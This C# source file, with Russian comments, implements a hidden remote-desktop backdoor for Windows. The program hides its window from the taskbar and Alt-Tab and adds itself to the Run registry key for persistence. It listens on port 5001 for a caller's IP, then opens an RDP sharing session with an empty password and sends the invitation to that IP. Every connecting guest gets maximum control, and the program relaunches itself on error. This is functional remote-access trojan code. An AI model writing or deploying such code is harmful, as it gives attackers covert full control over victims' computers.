using System;
using System.Text;
using System.Windows.Forms;
using RDPCOMAPILib;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace TCP_to_RDP_Converter
{
    public partial class Form1 : Form
    {

        public static RDPSession currentSession = null;
        public static void createSession()
        {
            currentSession = new RDPSession();

        }
        public static void Connect(RDPSession session)
        {
            session.ApplicationFilter.Enabled = false;
            session.OnSharedDesktopSettingsChanged += Session_OnSharedDesktopSettingsChanged;
            session.colordepth = 8;
            session.OnChannelDataSent += Session_OnChannelDataSent;
            session.OnAttendeeConnected += Incoming;
            session.Open();
        }

        private static void Session_OnChannelDataSent(object pChannel, int lAttendeeId, int BytesSent)
        {
            BytesSent = 5;
        }

        private static void Session_OnSharedDesktopSettingsChanged(int width, int height, int colordepth)
        {
            colordepth = 8;
        }

        public static void Disconnect(RDPSession session)
        {
            session.Close();

        }

        public static string getConnectionString(RDPSession session, String authString,
            string group, string password, int clientLimit)
        {

            IRDPSRAPIInvitation invitation =
                session.Invitations.CreateInvitation
                (authString, group, password, clientLimit);
            return invitation.ConnectionString;

        }

        private static void Incoming(object Guest)
        {
            IRDPSRAPIAttendee MyGuest = (IRDPSRAPIAttendee)Guest;
            MyGuest.ControlLevel = CTRL_LEVEL.CTRL_LEVEL_MAX;
        }
        IPHostEntry host1 = Dns.GetHostEntry(Dns.GetHostName());
        string adr;
        [DllImport("user32.dll")]
        private static extern int SetWindowLong(IntPtr window, int index, int value);

        [DllImport("user32.dll")]
        private static extern int GetWindowLong(IntPtr window, int index);

        private const int GWL_EXSTYLE = -20;
        private const int WS_EX_TOOLWINDOW = 0x00000080;

        public static void HideFromAltTab(IntPtr Handle)
        {
            SetWindowLong(Handle, GWL_EXSTYLE, GetWindowLong(Handle,
                GWL_EXSTYLE) | WS_EX_TOOLWINDOW);
        }
        public Form1()
        {
            InitializeComponent();
            FormBorderStyle = FormBorderStyle.None;
            WindowState = FormWindowState.Minimized;
            Height = 0;
            Width = 0;
            ShowIcon = false;
            ShowInTaskbar = false;
            HideFromAltTab(this.Handle);
            RegistryKey saveKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
            saveKey.SetValue("RDP Demon Server", Application.ExecutablePath);
            saveKey.Close();
            Thread myThread = new Thread(new ThreadStart(Slushaem));
            myThread.Start();

        }
        static string b = "";
        static string b2 = "";
        public void Slushaem()
        //-------------Слушаем что бы получить ip клиента------
        {
            try
            {
                TcpListener Listen_Data;
                Listen_Data = new TcpListener(IPAddress.Any, 5001);
                Listen_Data.Start();
                Socket ReceiveSocket = Listen_Data.AcceptSocket();
                Byte[] Receive = new Byte[1024];
                using (MemoryStream MessageR = new MemoryStream())
                {
                    //Количество считанных байт
                    Int32 ReceivedBytes;
                    do
                    {//Собственно читаем
                        ReceivedBytes = ReceiveSocket.Receive(Receive, Receive.Length, 0);
                        //и записываем в поток
                        MessageR.Write(Receive, 0, ReceivedBytes);
                        b = Encoding.ASCII.GetString(Receive, 0, ReceivedBytes); // наш ip от клиента
                                                                                 //Читаем до тех пор, пока в очереди не останется данных
                    } while (ReceiveSocket.Available > 0);
                    if (b != "")
                    {
                        textConnectionString.Invoke((MethodInvoker)delegate
                        {
                            textConnectionString.Text = b;
                        });
                        b2 = b;
                        b = "";
                        try
                        {
                            Disconnect(currentSession);
                        }
                        catch
                        { }
                        createSession();
                        Connect(currentSession);
                        foreach (IPAddress ip in host1.AddressList)
                            adr = ip.ToString();
                        Byte[] SendBytes = Encoding.Default.GetBytes(getConnectionString(currentSession, "Test", "Group", "", 5));
                        IPEndPoint EndPoint = new IPEndPoint(IPAddress.Parse(b2), 4000); // берется с Textbox-a text_IP адрес другого компьютера
                        Socket Connector = new Socket(EndPoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                        Connector.Connect(EndPoint);
                        Connector.Send(SendBytes);
                        Connector.Close();
                        Listen_Data.Stop();
                        Slushaem();


                    }
                }

            }
            catch
            {
                System.Diagnostics.Process.Start(Application.ExecutablePath);
                Environment.Exit(0);
            }
        }
    }
}
